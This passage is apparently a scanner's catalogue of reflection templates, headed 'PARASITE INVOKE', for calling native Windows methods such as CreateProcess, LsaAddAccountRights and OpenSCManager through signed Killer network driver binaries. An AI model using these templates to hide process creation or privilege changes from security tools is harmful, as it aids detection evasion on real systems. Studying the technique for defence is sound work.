        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe"");
        Type t = asm.GetType(""KillerLU.KillerLU"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: AllocConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KillerLU.exe"");
        Type t = asm.GetType(""KillerLU.KillerLU"", true);
        var methodInfo = t.GetMethod(""AllocConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KNDBWMService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaAddAccountRights"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr PolicyHandle, IntPtr AccountSid, LSA_UNICODE_STRING[] UserRights, uint CountOfRights });
        ===END SIGNATURE===

Method: FreeSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""FreeSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LookupAccountName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LookupAccountName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpSystemName, string lpAccountName, IntPtr psid, Int32& cbsid, StringBuilder domainName, Int32& cbdomainLength, Int32& use });
        ===END SIGNATURE===

Method: IsValidSid
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""IsValidSid"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr pSid });
        ===END SIGNATURE===

Method: LsaClose
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaClose"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr ObjectHandle });
        ===END SIGNATURE===

Method: LsaNtStatusToWinError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaNtStatusToWinError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { uint status });
        ===END SIGNATURE===

Method: SetStdHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""SetStdHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { int device, IntPtr handle });
        ===END SIGNATURE===

Method: CreateProcess
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""CreateProcess"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO& lpStartupInfo, PROCESS_INFORMATION& lpProcessInformation });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.Kernel32"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: FindWindow
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FindWindow"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpClassName, string lpWindowName });
        ===END SIGNATURE===

Method: AttachConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""AttachConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { uint dwProcessId });
        ===END SIGNATURE===

Method: FreeConsole
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""FreeConsole"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetConsoleCtrlHandler
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""SetConsoleCtrlHandler"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { ConsoleCtrlDelegate HandlerRoutine, bool Add });
        ===END SIGNATURE===

Method: GenerateConsoleCtrlEvent
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\KSPSService.exe"");
        Type t = asm.GetType(""winsw.SigIntHelper"", true);
        var methodInfo = t.GetMethod(""GenerateConsoleCtrlEvent"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { CtrlTypes dwCtrlEvent, uint dwProcessGroupId });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, IntPtr lpInfo });
        ===END SIGNATURE===

Method: ChangeServiceConfig2
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""ChangeServiceConfig2"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hService, SERVICE_CONFIG_INFOLEVEL dwInfoLevel, SERVICE_FAILURE_ACTIONS& sfa });
        ===END SIGNATURE===

Method: OpenSCManager
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenSCManager"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string machineName, string databaseName, uint dwAccess });
        ===END SIGNATURE===

Method: OpenService
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""OpenService"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess });
        ===END SIGNATURE===

Method: CloseServiceHandle
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""CloseServiceHandle"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hSCObject });
        ===END SIGNATURE===

Method: SetServiceStatus
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""SetServiceStatus"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hServiceStatus, SERVICE_STATUS& lpServiceStatus });
        ===END SIGNATURE===

Method: LsaOpenPolicy
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
        var methodInfo = t.GetMethod(""LsaOpenPolicy"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { LSA_UNICODE_STRING& SystemName, LSA_OBJECT_ATTRIBUTES& ObjectAttributes, int DesiredAccess, IntPtr& PolicyHandle });
        ===END SIGNATURE===

Method: LsaAddAccountRights
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\killernetworkcomponent.inf_amd64_df62915def504522\xTendSoftAPService.exe"");
        Type t = asm.GetType(""winsw.Advapi32"", true);
